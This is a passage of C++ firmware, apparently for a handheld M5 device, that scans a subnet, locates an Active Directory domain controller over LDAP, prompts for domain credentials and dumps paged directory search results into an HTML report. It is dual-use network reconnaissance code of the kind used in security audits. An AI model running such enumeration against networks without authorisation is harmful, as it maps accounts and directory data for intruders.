    Serial.println(sameSubnet ? "[SCAN] Same subnet â†’ ARP" : "[SCAN] TCP fallback");

    if (sameSubnet)
    {
        send_arp(base_ip, hosts);
        read_arp_table(base_ip, 1, 254, hosts);
        for (int i = 1; i <= 254; i++)
        {
            IPAddress target(o1, o2, o3, i);
            if (arpRequest(target))
            {
                if (std::find(hosts.begin(), hosts.end(), target) == hosts.end())
                    hosts.push_back(target);
            }
            delayMicroseconds(80);
        }
    }
    else
    {
        for (int i = 1; i <= 254; i++)
        {
            IPAddress target(o1, o2, o3, i);
            WiFiClient tmp;
            if (connectWithTimeout(tmp, target, 389, 200))
            {
                hosts.push_back(target);
                tmp.stop();
            }
            delay(10);
        }
    }

    // === LDAP Probing ===
    for (auto ip : hosts)
    {
        WiFiClient cli;
        if (!cli.connect(ip, 389)) continue;
        if (!ldapBind(cli, "", "")) continue;
        if (!getDefaultNamingContext(cli)) continue;
        cli.stop();
        dcIP = ip;
        ldapUiUpdateContext(dcIP, ldapDomainDN);
        break;
    }

    if (dcIP[0] == 0)
    {
        ldapUiLogLine("[SCAN] No DC found.");
        return false;
    }

    // === Always ask credentials ===
    enterDebounce();
    M5.Display.clear();
    M5.Display.setCursor(5, 0);
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.println("AD Login:");
    String rawUser = getUserInput("AD Login:");
    ldapUsername = ldapNormalizeUsername(rawUser);
    ldapUiLogLine("[AUTH] Login: " + ldapUsername);


    enterDebounce();
    M5.Display.clear();
    M5.Display.setCursor(5, 0);
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.println("AD Password:");
    ldapPassword = getUserInput("AD Password:");

    WiFiClient cli;
    if (!cli.connect(dcIP, 389))
    {
        ldapUiLogLine("[ERROR] TCP connect failed during AUTH");
        return false;
    }

    bool ok = ldapBind(cli, ldapUsername, ldapPassword);
    cli.stop();
    ldapUiLogLine(ok ? "[AUTH] SUCCESS" : "[AUTH] FAILED");
    return ok;
}




// Petit hexdump pour debug
void hexDump(const char* label, const uint8_t* buf, int len, int maxBytes = 256)
{
    Serial.printf("%s (len=%d, showing %d bytes):\n",
                  label, len, (len < maxBytes ? len : maxBytes));

    int shown = (len < maxBytes ? len : maxBytes);
    for (int i = 0; i < shown; i++) {
        Serial.printf("%02X ", buf[i]);
        if ((i % 16) == 15) Serial.println();
    }
    Serial.println();
}

// Cherche le SearchResultDone et log le resultCode (0 = success)
void debugLDAPResultCode(const uint8_t* buf, int len)
{
    bool found = false;
    for (int i = 0; i < len - 3; i++) {
        if (buf[i] == 0x65) { // [APPLICATION 5] SearchResultDone
            int end = i + 50;
            if (end > len) end = len;

            for (int j = i; j < end - 2; j++) {
                if (buf[j] == 0x0A && buf[j+1] == 0x01) {
                    uint8_t code = buf[j+2];
                    //Serial.printf("[LDAP][DEBUG] SearchResultDone resultCode = %u\n", code);
                    found = true;
                    break;
                }
            }
        }
        if (found) break;
    }
    if (!found) {
        //Serial.println("[LDAP][DEBUG] resultCode NOT found in buffer");
    }
}

// VÃ©rifie juste si les noms d'attributs apparaissent dans la rÃ©ponse brute
void debugSearchForAttrNames(
    const uint8_t* buf, int len,
    const std::vector<String>& attrs
){
    for (auto &a : attrs) {
        int alen = a.length();
        bool hit = false;
        for (int i = 0; i < len - alen; i++) {
            if (memcmp(&buf[i], a.c_str(), alen) == 0) {
                //Serial.printf("[LDAP][DEBUG] Attribute name '%s' found at offset %d\n",a.c_str(), i);
                hit = true;
                break;
            }
        }
        if (!hit) {
            //Serial.printf("[LDAP][DEBUG] Attribute name '%s' NOT found in this page\n",a.c_str());
        }
    }
}

// Parse une rÃ©ponse LDAP de recherche et Ã©crit les entrÃ©es dans le fichier HTML.
// Retourne le nombre d'entrÃ©es (SearchResultEntry) rÃ©ellement Ã©crites.
int parseLDAPSearchResponse(
    const uint8_t* buf,
    int len,
    const std::vector<String>& attrs,
    fs::File &outFile
){
    int pos = 0;
    int entryCount = 0;

    while (pos < len) {
        uint8_t tag;
        int vlen;
        const uint8_t* val;

        // Chaque LDAPMessage est un SEQUENCE (0x30)
        if (!readTLV(buf, len, pos, tag, vlen, val)) {
            break;
        }

        if (tag != 0x30) {
            // Pas un LDAPMessage, on essaie dâ€™avancer quand mÃªme
            continue;
        }

        int mPos = 0;
        uint8_t t;
        int l;
        const uint8_t* v;

        // messageID (INTEGER)
        if (!readTLV(val, vlen, mPos, t, l, v)) {
            continue;
        }

        // protocolOp
        if (!readTLV(val, vlen, mPos, t, l, v)) {
            continue;
        }

        if (t == 0x64) {
            // SearchResultEntry [APPLICATION 4]
            const uint8_t* entryBuf = v;
            int entryLen = l;

            int ePos = 0;
            uint8_t t3;
            int l3;
            const uint8_t* v3;

            // objectName (LDAPDN) â€“ on s'en fiche
            if (!readTLV(entryBuf, entryLen, ePos, t3, l3, v3)) {
                continue;
            }

            // attributes : PartialAttributeList (SEQUENCE)
            if (!readTLV(entryBuf, entryLen, ePos, t3, l3, v3)) {
                continue;
            }
            if (t3 != 0x30) {
                // pas une SEQUENCE â†’ bizarre, on skip
                continue;
            }

            const uint8_t* attrBuf = v3;
            int attrLen = l3;

            // Pour cette entrÃ©e : rÃ©cupÃ©rer chaque attribut demandÃ©
            std::vector<String> values;
            values.resize(attrs.size());

            bool hasSomething = false;
            for (int i = 0; i < (int)attrs.size(); i++) {
                String valStr;
                if (extractAttributeValue(attrBuf, attrLen, attrs[i].c_str(), valStr)) {
                    values[i] = valStr;
                    if (valStr.length() > 0) hasSomething = true;
                } else {
                    values[i] = "";
                }
            }

            // Si au moins un champ non vide, on Ã©crit une ligne HTML
            if (hasSomething) {
                outFile.print("<tr>");
                for (int i = 0; i < (int)values.size(); i++) {
                    outFile.print("<td>");
                    outFile.print(values[i]);
                    outFile.print("</td>");
                }
                outFile.println("</tr>");
                entryCount++;
            }
        }
        else if (t == 0x65) {
            // SearchResultDone â†’ on log le resultCode
            debugLDAPResultCode(val, vlen);
        }
        else if (t == 0x73) {
            // SearchResultReference (referral)
            Serial.println("[LDAP] SearchResultReference (referral) reÃ§u (ignorÃ©).");
        }
        // autres protocolOp â†’ ignorÃ©s
    }

    return entryCount;
}

// Boucle de recherche LDAP avec pagination
void ldapSearchPagedLoop(const IPAddress &dcIP,
                         const String &baseDN,
                         const String &filter,
                         const std::vector<String> &attrs,
                         fs::File &outFile)
{
    // --------------------------------------------------------------------
    // Conversion des attributs (std::vector<String>) en const char*[]
    // pour buildLDAPSearchPaged()
    // --------------------------------------------------------------------
    const int MAX_ATTRS = 16;
    int attrCount = attrs.size();
    if (attrCount > MAX_ATTRS) {
        attrCount = MAX_ATTRS;
    }

    const char *attrListC[MAX_ATTRS];
    for (int i = 0; i < attrCount; ++i) {
        attrListC[i] = attrs[i].c_str();
    }

    // --------------------------------------------------------------------
    // Variables de pagination
    // --------------------------------------------------------------------
    uint8_t cookie[1024];
    int cookieLen = 0;
    memset(cookie, 0, sizeof(cookie));

    int page         = 1;
    int totalEntries = 0;

    int pageSize = 5;

    Serial.println("[LDAP] Starting paged search loop...");

    while (true) {

        // ----------------------------------------------------------------
        // Connexion TCP + BIND authentifiÃ© (avec retry sur connect)
        // ----------------------------------------------------------------
        Serial.println("[LDAP] Search: doing AUTH bind...");
       
        const int MAX_CONN_ATTEMPTS = 3;
        const int MAX_BIND_ATTEMPTS = 3;
        
        WiFiClient cli;
        bool tcpOk  = false;
        bool bindOk = false;
        
        // === Retries TCP connect ===
        for (int attempt = 1; attempt <= MAX_CONN_ATTEMPTS; ++attempt) {
            cli.stop(); 
            if (cli.connect(dcIP, 389)) {
                tcpOk = true;
                if (attempt > 1) {
                    Serial.printf("[LDAP] connect() succeeded after %d attempts\n", attempt);
                    ldapUiLogLine("[INFO] Page " + String(page) +
                                  ": TCP connect OK after " + String(attempt) + " attempts");
                }
                break;
            }
        
            Serial.printf("[LDAP] ERROR: connect() failed in search loop (attempt %d/%d)\n",
                          attempt, MAX_CONN_ATTEMPTS);
            ldapUiLogLine("[ERROR] Page " + String(page) +
                          ": TCP connect failed (attempt " + String(attempt) + "/" +
                          String(MAX_CONN_ATTEMPTS) + ")");
        
            delay(300); // petit cooldown entre tentatives
        }
        
        if (!tcpOk) {
            Serial.println("[LDAP] FATAL: giving up after TCP retries");
            ldapUiLogLine("[FATAL] Page " + String(page) +
                          ": TCP connect failed after retries");
            cli.stop();
            break;  // on sort de la boucle de pages
        }
        
        // === Retries AUTH BIND ===
        for (int attempt = 1; attempt <= MAX_BIND_ATTEMPTS; ++attempt) {
            if (ldapBind(cli, ldapUsername, ldapPassword)) {
                bindOk = true;
                if (attempt > 1) {
                    Serial.printf("[LDAP] AUTH bind succeeded after %d attempts\n", attempt);
                    ldapUiLogLine("[INFO] Page " + String(page) +
                                  ": AUTH bind OK after " + String(attempt) + " attempts");
                }
                break;
            }
        
            Serial.printf("[LDAP] ERROR: AUTH bind failed in search loop (attempt %d/%d)\n",
                          attempt, MAX_BIND_ATTEMPTS);
            ldapUiLogLine("[ERROR] Page " + String(page) +
                          ": AUTH bind failed (attempt " + String(attempt) + "/" +
                          String(MAX_BIND_ATTEMPTS) + ")");
        
            delay(200);
        }
        
        if (!bindOk) {
            Serial.println("[LDAP] FATAL: giving up after AUTH bind retries");
            ldapUiLogLine("[FATAL] Page " + String(page) +
                          ": AUTH bind failed after retries");
            cli.stop();
            break;  // on sort de la boucle de pages
        }



        // ----------------------------------------------------------------
        // Construction de la SearchRequest paginÃ©e
        // ----------------------------------------------------------------
        uint8_t pkt[2048];  // taille suffisante pour le PDU
        int pktLen = buildLDAPSearchPaged(
            pkt,
            sizeof(pkt),
            baseDN.c_str(),       // String -> const char*
            filter.c_str(),       // String -> const char*
            attrListC,            // tableau const char*[]
            attrCount,            // nombre d'attributs
            pageSize,
            cookie,
            cookieLen
        );

        if (pktLen <= 0) {
            Serial.printf("[LDAP] ERROR: buildLDAPSearchPaged() returned %d\n", pktLen);
            cli.stop();
            break;
        }

        Serial.printf("[LDAP] Sending paged SearchRequest (len=%d) for page %d (cookieLen=%d, pageSize=%d)\n",
                      pktLen, page, cookieLen, pageSize);

        // Debug structure de la requÃªte
        debugLDAPRequestStructure(pkt, pktLen);

        // Hexdump TX
        //hexDump("[LDAP][DEBUG] Outgoing SearchRequest", pkt, pktLen, 256);

        // ----------------------------------------------------------------
        // Envoi / rÃ©ception dans le buffer global ldapRespBuf
        // ----------------------------------------------------------------
        cli.write(pkt, pktLen);

        int respLen = 0;
        memset(ldapRespBuf, 0, sizeof(ldapRespBuf));

        uint32_t t0 = millis();
        while (millis() - t0 < 2000) {  // 2s de fenÃªtre
            int avail = cli.available();
            if (avail > 0) {
                int toRead = avail;
                if (respLen + toRead > LDAP_BUF_SIZE) {
                    toRead = LDAP_BUF_SIZE - respLen;
                }
                if (toRead <= 0) break;

                int r = cli.read(ldapRespBuf + respLen, toRead);
                if (r > 0) {
                    respLen += r;
                    t0 = millis();  // reset timeout si on reÃ§oit encore
                }
            } else {
                delay(5);
            }
        }
        cli.stop();

        if (respLen <= 0) {
            Serial.printf("[LDAP] ERROR: empty or invalid response from DC (respLen=%d)\n", respLen);
            break;
        }

        Serial.printf("[LDAP] Search response received (%d bytes)\n", respLen);
        //hexDump("[LDAP][DEBUG] Search RAW HEX", ldapRespBuf, respLen, 256);

        // Debug resultCode
        //debugLDAPResultCode(ldapRespBuf, respLen);

        // Debug prÃ©sence des noms d'attributs dans la page
        //debugSearchForAttrNames(ldapRespBuf, respLen, attrs);

        // ----------------------------------------------------------------
        // Parsing des rÃ©sultats de recherche
        // ----------------------------------------------------------------
        int entriesThisPage = parseLDAPSearchResponse(ldapRespBuf, respLen, attrs, outFile);
        totalEntries += entriesThisPage;
        ldapUiLogLine("[PAGE] " + String(page) + ": " + String(totalEntries) + " entries");

        Serial.printf("[LDAP] Page %d: %d entries parsed (total so far: %d)\n", page, entriesThisPage, totalEntries);

        // ----------------------------------------------------------------
        // Extraction du cookie de pagination
        // ----------------------------------------------------------------
        uint8_t newCookie[1024];
        int newCookieLen = 0;
        int serverPageSize = 0;

        if (!extractPagingCookie(
                ldapRespBuf,
                respLen,
                newCookie,
                sizeof(newCookie),
                newCookieLen,
                serverPageSize))
        {
            Serial.println("[LDAP] WARNING: extractPagingCookie() failed or OID not found â†’ stop.");
            break;
        }

        if (newCookieLen == 0) {
            Serial.println("[LDAP] Cookie empty â†’ enumeration complete.");
            break;
        }

        // Copie du cookie pour la page suivante
        memcpy(cookie, newCookie, newCookieLen);
        cookieLen = newCookieLen;

        //Serial.printf("[LDAP][DEBUG]  New cookie extracted, len=%d\n", cookieLen);
        //Serial.printf("[LDAP][DEBUG]  pageSize from server = %d\n", serverPageSize);

        page++;
    }

    Serial.printf("[LDAP] Total entries parsed in this search (all pages): %d\n", totalEntries);
}


bool readTLV(const uint8_t* buf, int len, int& pos, uint8_t& tag, int& valLen, const uint8_t*& val)
{
    if (pos >= len) return false;

    tag = buf[pos++];

    if (pos >= len) return false;
    uint8_t L = buf[pos++];

    if (L < 0x80)
    {
        // Longueur courte
        valLen = L;
    }
    else
    {
        // Longueur longue : 1 Ã  4 octets
        int nb = L & 0x7F;
        if (nb < 1 || nb > 4) return false;
        if (pos + nb > len) return false;

        valLen = 0;
        while (nb--)
        {
            valLen = (valLen << 8) | buf[pos++];
        }
    }

    if (pos + valLen > len) return false;

    val = &buf[pos];
    pos += valLen;

    return true;
}




//-----------------------------------------------------------------------------

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// ASN.1 / LDAP Core Structures
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// Encode la longueur DER d'une SEQUENCE (ou de n'importe quel champ)
// lenPos = offset du premier octet de longueur (aprÃ¨s le tag)
// contentLen = nombre d'octets de contenu suivant lenPos+N
int encodeSeqLength(uint8_t *pkt, int lenPos, int contentLen)
{
    if (contentLen < 128) {
        pkt[lenPos] = (uint8_t)contentLen;
        return 1;
    } else if (contentLen < 256) {
        memmove(pkt + lenPos + 2, pkt + lenPos + 1, contentLen);
        pkt[lenPos]   = 0x81;
        pkt[lenPos+1] = (uint8_t)contentLen;
        return 2;
    } else {
        memmove(pkt + lenPos + 3, pkt + lenPos + 1, contentLen);
        pkt[lenPos]   = 0x82;
        pkt[lenPos+1] = (uint8_t)((contentLen >> 8) & 0xFF);
        pkt[lenPos+2] = (uint8_t)(contentLen & 0xFF);
        return 3;
    }
}

// Extraction du cookie de pagination RFC2696 depuis la rÃ©ponse LDAP
// Retourne true si trouvÃ©, false sinon.
// - cookieOut / maxCookieLen : buffer fourni par l'appelant
// - cookieLenOut : longueur rÃ©elle du cookie (0 = derniÃ¨re page)
// - serverPageSizeOut : pageSize renvoyÃ© par le serveur (info/debug)
bool extractPagingCookie(
    const uint8_t* buf,
    int len,
    uint8_t* cookieOut,
    int maxCookieLen,
    int &cookieLenOut,
    int &serverPageSizeOut
){
    cookieLenOut      = 0;
    serverPageSizeOut = 0;

    const char* oidStr = "1.2.840.113556.1.4.319";
    int oidLen = strlen(oidStr);

    //Serial.printf("[LDAP][DEBUG] extractPagingCookie(): scanning %d bytes\n", len);

    // Cherche l'OID ASCII du contrÃ´le de pagination
    for (int i = 0; i <= len - oidLen; ++i) {
        if (memcmp(buf + i, oidStr, oidLen) != 0)
            continue;

        //Serial.printf("[LDAP][DEBUG]  OID found at offset %d\n", i);

        // AprÃ¨s l'OID, on avance jusqu'au prochain OCTET STRING (controlValue)
        int p = i + oidLen;
        int guard = 0;
        while (p < len && buf[p] != 0x04 && guard < 64) {
            ++p;
            ++guard;
        }
        if (p >= len || buf[p] != 0x04) {
            //Serial.println("[LDAP][DEBUG]  ERROR: controlValue OCTET STRING not found after OID");
            return false;
        }

        // On parse ce OCTET STRING via readTLV (gÃ¨re short/long form)
        int pos = p;
        uint8_t tag;
        int vLen;
        const uint8_t* val;

        if (!readTLV(buf, len, pos, tag, vLen, val) || tag != 0x04) {
            //Serial.printf("[LDAP][DEBUG]  ERROR: readTLV(controlValue) failed or tag!=0x04 (tag=0x%02X)\n", tag);
            return false;
        }

        int cvOffset = (int)(val - buf);
        //Serial.printf("[LDAP][DEBUG]  controlValue length=%d, value starts at offset %d\n",vLen, cvOffset);

        if (vLen <= 0) {
            //Serial.println("[LDAP][DEBUG]  ERROR: controlValue empty");
            return false;
        }

        // controlValue = OCTET STRING contenant :
        //   SEQUENCE { pageSize INTEGER, cookie OCTET STRING }
        int pos2 = 0;
        uint8_t tag2;
        int len2;
        const uint8_t* val2;

        if (!readTLV(val, vLen, pos2, tag2, len2, val2) || tag2 != 0x30) {
            //Serial.printf("[LDAP][DEBUG]  ERROR: controlValue not a SEQUENCE (tag=0x%02X)\n", tag2);
            return false;
        }

        int seqOffset = (int)(val2 - buf);
        //Serial.printf("[LDAP][DEBUG]  realSearchControlValue SEQUENCE length=%d, start=%d\n",len2, seqOffset);

        if (len2 <= 0) {
            //Serial.println("[LDAP][DEBUG]  ERROR: SEQUENCE inside controlValue empty");
            return false;
        }

        // Ã€ l'intÃ©rieur : INTEGER pageSize
        int pos3 = 0;
        uint8_t tag3;
        int len3;
        const uint8_t* val3;

        if (!readTLV(val2, len2, pos3, tag3, len3, val3) || tag3 != 0x02) {
            //Serial.printf("[LDAP][DEBUG]  ERROR: expected INTEGER for pageSize, tag=0x%02X\n", tag3);
            return false;
        }

        int pageSize = 0;
        for (int k = 0; k < len3; ++k) {
            pageSize = (pageSize << 8) | val3[k];
        }
        serverPageSizeOut = pageSize;
        //Serial.printf("[LDAP][DEBUG]  pageSize from server = %d\n", pageSize);

        // Puis OCTET STRING cookie
        if (!readTLV(val2, len2, pos3, tag3, len3, val3) || tag3 != 0x04) {
            //Serial.printf("[LDAP][DEBUG]  ERROR: expected OCTET STRING for cookie, tag=0x%02X\n", tag3);
            return false;
        }

        if (len3 <= 0) {
            // Cookie vide â†’ derniÃ¨re page
            //Serial.println("[LDAP][DEBUG]  cookie length=0 (last page)");
            cookieLenOut = 0;
            return true;
        }

        if (len3 > maxCookieLen) {
            //Serial.printf("[LDAP][DEBUG]  WARNING: cookie too large (%d) truncating to %d\n",len3, maxCookieLen);
            len3 = maxCookieLen;
        }

        memcpy(cookieOut, val3, len3);
        cookieLenOut = len3;

        //Serial.printf("[LDAP][DEBUG]  cookie extracted, len=%d\n", cookieLenOut);
        return true;
    }

    //Serial.println("[LDAP][DEBUG] extractPagingCookie(): OID not found in buffer");
    return false;
}

// Construit une requÃªte RootDSE pour rÃ©cupÃ©rer defaultNamingContext
int buildRootDSERequest(uint8_t *pkt, int maxLen)
{
    int p = 0;

    if (maxLen < 64) {
        Serial.println("[RootDSE] ERROR: buffer too small");
        return 0;
    }

    pkt[p++] = 0x30;                    // LDAPMessage SEQUENCE
    int ldapLenPos      = p++;
    int ldapContentStart = p;

    // messageID = 1
    pkt[p++] = 0x02; pkt[p++] = 0x01; pkt[p++] = 0x01;

    // searchRequest [APPLICATION 3]
    pkt[p++] = 0x63;
    int srLenPos       = p++;
    int srContentStart = p;

    // baseObject = "" (RootDSE)
    pkt[p++] = 0x04; pkt[p++] = 0x00;

    // scope = baseObject (0)
    pkt[p++] = 0x0A; pkt[p++] = 0x01; pkt[p++] = 0x00;

    // derefAliases = never (0)
    pkt[p++] = 0x0A; pkt[p++] = 0x01; pkt[p++] = 0x00;

    // sizeLimit = 0
    pkt[p++] = 0x02; pkt[p++] = 0x01; pkt[p++] = 0x00;

    // timeLimit = 0
    pkt[p++] = 0x02; pkt[p++] = 0x01; pkt[p++] = 0x00;

    // typesOnly = FALSE
    pkt[p++] = 0x01; pkt[p++] = 0x01; pkt[p++] = 0x00;

    // Filtre : present (objectClass=*)
    // Astuce : passe "objectClass" sans "=" pour forcer le filtre "present" dans encodeLDAPFilter()
    encodeLDAPFilter(pkt, p, "objectClass");

    // Attributes : SEQUENCE OF AttributeDescription
    pkt[p++] = 0x30;
    int attrSeqLenPos = p++;

    const char *attr = "defaultNamingContext";
    int attrLen = strlen(attr);
    pkt[p++] = 0x04;
    pkt[p++] = attrLen;
    memcpy(pkt + p, attr, attrLen);
    p += attrLen;

    // Longueur SEQUENCE d'attributs
    int attrContentLen = p - (attrSeqLenPos + 1);
    int attrLenBytes   = encodeSeqLength(pkt, attrSeqLenPos, attrContentLen);
    p += (attrLenBytes - 1);

    // Longueur du searchRequest
    int srContentLen = p - srContentStart;
    int srLenBytes   = encodeSeqLength(pkt, srLenPos, srContentLen);
    p += (srLenBytes - 1);

    // Longueur globale de LDAPMessage
    int ldapContentLen = p - ldapContentStart;
    int ldapLenBytes   = encodeSeqLength(pkt, ldapLenPos, ldapContentLen);
    p += (ldapLenBytes - 1);

    Serial.printf("[RootDSE] buildRootDSERequest: final len=%d\n", p);
    return p;
}


bool getDefaultNamingContext(WiFiClient &client)
{
    Serial.println("[RootDSE] Sending RootDSE request...");

    // Construire la requÃªte RootDSE proprement
    uint8_t pkt[128];
    int pktLen = buildRootDSERequest(pkt, sizeof(pkt));
    if (pktLen <= 0) {
        Serial.println("[RootDSE] ERROR: buildRootDSERequest() failed");
        return false;
    }

    Serial.printf("[RootDSE] Request len=%d\n", pktLen);
    hexDump("[RootDSE] Request HEX", pkt, pktLen, pktLen);

    int written = client.write(pkt, pktLen);
    Serial.printf("[RootDSE] client.write() returned %d\n", written);

    // Lire la rÃ©ponse complÃ¨te
    uint8_t buf[512];
    int total = 0;
    uint32_t t0 = millis();

    while (millis() - t0 < 1000)
    {
        int avail = client.available();
        if (avail > 0)
        {
            int toRead = min(avail, (int)(sizeof(buf) - total));
            if (toRead <= 0) break;

            int r = client.read(buf + total, toRead);
            if (r > 0) {
                total += r;
                t0 = millis(); // on reset le timeout si Ã§a arrive en plusieurs paquets
            }
        }
        delay(5);
    }

    Serial.printf("[RootDSE] Received %d bytes\n", total);
    if (total > 0) {
        hexDump("[RootDSE] Response HEX", buf, total, total);
    }

    if (total < 10)
    {
        Serial.println("[RootDSE] FAIL (no data)");
        return false;
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // Parse du premier LDAPMessage avec readTLV
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    int pos = 0;
    uint8_t tag;
    int vlen;
    const uint8_t* val;

    // LDAPMessage ::= SEQUENCE
    if (!readTLV(buf, total, pos, tag, vlen, val) || tag != 0x30) {
        Serial.printf("[RootDSE] ERROR: top-level not SEQUENCE (tag=0x%02X)\n", tag);
        return false;
    }

    const uint8_t* msgBuf = val;
    int msgLen = vlen;

    int mPos = 0;
    uint8_t t;
    int l;
    const uint8_t* v;

    // messageID (INTEGER)
    if (!readTLV(msgBuf, msgLen, mPos, t, l, v) || t != 0x02) {
        Serial.println("[RootDSE] ERROR: cannot read messageID");
        return false;
    }

    int msgId = 0;
    for (int i = 0; i < l; i++) msgId = (msgId << 8) | v[i];
    Serial.printf("[RootDSE] messageID=%d\n", msgId);

    // protocolOp (on attend SearchResultEntry = 0x64)
    if (!readTLV(msgBuf, msgLen, mPos, t, l, v)) {
        Serial.println("[RootDSE] ERROR: cannot read protocolOp");
        return false;
    }
    if (t != 0x64) {
        Serial.printf("[RootDSE] ERROR: protocolOp is not SearchResultEntry (tag=0x%02X)\n", t);
        return false;
    }

    const uint8_t* entryBuf = v;
    int entryLen = l;

    int ePos = 0;
    uint8_t t2;
    int l2;
    const uint8_t* v2;

    // objectName (LDAPDN) â€“ RootDSE â†’ DN vide, on s'en fiche
    if (!readTLV(entryBuf, entryLen, ePos, t2, l2, v2)) {
        Serial.println("[RootDSE] ERROR: cannot read objectName");
        return false;
    }

    // attributes : PartialAttributeList (SEQUENCE)
    if (!readTLV(entryBuf, entryLen, ePos, t2, l2, v2) || t2 != 0x30) {
        Serial.printf("[RootDSE] ERROR: attributes is not SEQUENCE (tag=0x%02X)\n", t2);
        return false;
    }

    const uint8_t* attrBuf = v2;
    int attrLen = l2;

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // Utiliser extractAttributeValue() pour rÃ©cupÃ©rer defaultNamingContext
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    String dnStr;
    if (!extractAttributeValue(attrBuf, attrLen, "defaultNamingContext", dnStr)) {
        Serial.println("[RootDSE] ERROR: defaultNamingContext not found in attributes");
        return false;
    }

    ldapDomainDN = dnStr;

    // Extraire le NetBIOS Ã  partir du premier DC=xxx
    int x = ldapDomainDN.indexOf("DC=");
    if (x != -1)
    {
        int c = ldapDomainDN.indexOf(',', x);
        if (c < 0) c = ldapDomainDN.length();
        ldapDomainNetbios = ldapDomainDN.substring(x+3, c);
    }

    Serial.println("[RootDSE] DN      = " + ldapDomainDN);
    Serial.println("[RootDSE] NETBIOS = " + ldapDomainNetbios);

    return true;
}


static const char LDAP_HTML_UI[] PROGMEM =
"<style>:root{--bg:#05070d;--panel:#0b0f1e;--hdr:#140019;--grid:#3a003a;--txt:#e6e6e6;--mut:#8a8a8a;--red:#ff003c;--pink:#ff2a6d;--cyan:#00eaff;--violet:#8f00ff;--hover:#1a0024}body{margin:0;padding:16px;background:radial-gradient(circle at 50% 0,#12001a,#05070d 60%);color:var(--txt);font-family:monospace;font-size:13px}h2{margin:0 0 14px;font-size:20px;color:var(--red);letter-spacing:1px;text-transform:uppercase;text-shadow:0 0 6px rgba(255,0,60,.6),0 0 18px rgba(255,0,60,.4);border-bottom:1px solid var(--grid);padding-bottom:6px}table{width:100%;border-collapse:collapse;background:var(--panel);box-shadow:0 0 0 1px var(--grid),0 0 32px rgba(255,0,90,.25)}th{background:linear-gradient(180deg,#24001f,#140019);color:var(--pink);border:1px solid var(--grid);padding:7px 10px;text-align:left;white-space:nowrap;font-weight:700;text-shadow:0 0 6px rgba(255,42,109,.5);cursor:pointer;user-select:none}th::after{content:\"\";float:right;opacity:.4}th.sorted-asc::after{content:\" â–²\";color:var(--cyan);opacity:1}th.sorted-desc::after{content:\" â–¼\";color:var(--red);opacity:1}td{border:1px solid var(--grid);padding:7px 10px;white-space:nowrap;max-width:520px;overflow:hidden;text-overflow:ellipsis}tr:nth-child(even) td{background:#090c1f}tr:hover td{background:var(--hover);box-shadow:inset 0 0 0 9999px rgba(255,0,90,.08),inset 0 0 12px rgba(255,0,90,.6)}td:empty{color:var(--mut);font-style:italic}td.ts{color:var(--cyan)}td.ts::after{content:\" â±\";opacity:.4}td.ts-old{color:var(--mut)}td.ts-recent{color:#00ff9c;font-weight:600}::-webkit-scrollbar{height:8px}::-webkit-scrollbar-thumb{background:linear-gradient(180deg,var(--red),var(--violet))}</style>"
"<script>document.addEventListener(\"DOMContentLoaded\",()=>{document.querySelectorAll(\"th\").forEach((h,i)=>{h.addEventListener(\"click\",()=>{const t=h.closest(\"table\"),r=[...t.querySelectorAll(\"tr\")].slice(1),asc=!h.classList.contains(\"sorted-asc\");t.querySelectorAll(\"th\").forEach(x=>x.classList.remove(\"sorted-asc\",\"sorted-desc\"));h.classList.add(asc?\"sorted-asc\":\"sorted-desc\");r.sort((x,y)=>{let A=x.children[i].dataset.raw||x.children[i].innerText.trim(),B=y.children[i].dataset.raw||y.children[i].innerText.trim();return!isNaN(A)&&!isNaN(B)?asc?A-B:B-A:asc?A.localeCompare(B,void 0,{numeric:!0}):B.localeCompare(A,void 0,{numeric:!0})});r.forEach(e=>t.appendChild(e))})});const E=11644473600000n,F=t=>new Date(Number(BigInt(t)/10000n-E)),L=s=>new Date(s.slice(0,4)+\"-\"+s.slice(4,6)+\"-\"+s.slice(6,8)+\"T\"+s.slice(8,10)+\":\"+s.slice(10,12)+\":\"+s.slice(12,14)+\"Z\"),M=d=>d.getUTCFullYear()+\"-\"+String(d.getUTCMonth()+1).padStart(2,\"0\")+\"-\"+String(d.getUTCDate()).padStart(2,\"0\")+\" \"+String(d.getUTCHours()).padStart(2,\"0\")+\":\"+String(d.getUTCMinutes()).padStart(2,\"0\")+\":\"+String(d.getUTCSeconds()).padStart(2,\"0\")+\" UTC\";document.querySelectorAll(\"td\").forEach(td=>{const v=td.innerText.trim();let d=null;/^\\d{16,}$/.test(v)?d=F(v):/^\\d{14}\\.0Z$/.test(v)&&(d=L(v));if(d&&!isNaN(d)){td.dataset.raw=v,td.innerText=M(d),td.title=\"RAW: \"+v,td.classList.add(\"ts\");const a=(Date.now()-d.getTime())/864e5;a>1825?td.classList.add(\"ts-old\"):a<90&&td.classList.add(\"ts-recent\")}})});</script>";


void ldapExtractAndSave(
    const IPAddress& dcIP,
    String& baseDN,
    const String& filter,
    const char* filename,
    const char* title,
